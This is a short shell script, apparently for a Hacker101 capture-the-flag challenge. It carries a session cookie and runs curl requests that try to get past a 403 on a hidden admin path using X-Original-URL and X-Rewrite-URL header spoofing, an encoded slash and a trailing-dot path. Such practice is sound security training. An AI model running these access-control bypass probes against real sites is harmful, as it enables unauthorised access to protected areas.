base="https://a53ff99d441c8e4ed6bca6c681460e18.ctf.hacker101.com"
cookie="Cookie: seen=true; token=ZjJhMGU4MDU1MTJiYTY2NGIwMDYzOGJmZjIxYWIzYzEwNzYzYmU4ZTc3NjcxYTVlMmJkNDc1ZTY0ZDEwZmU3MjE0NjM4Y2Q5M2RjYzBiOGUzOTZjZGNlM2Q2ZjQwOTk2YTBhZjdjNmE1YjgwNDk4MmE1Y2U1OWUzMmIyMmI4NjA=; userhash=7ff3e7b756ccf1ae2a909dc8eca2772b"

# Bypasses 403 classiques
curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" -H "$cookie" "$base/s3cr3t-4dm1n/"
curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" -H "$cookie" -H "X-Original-URL: /s3cr3t-4dm1n/" "$base/"
curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" -H "$cookie" -H "X-Rewrite-URL: /s3cr3t-4dm1n/" "$base/"
curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" -H "$cookie" "$base/%2fs3cr3t-4dm1n/"
curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" -H "$cookie" "$base/s3cr3t-4dm1n/."

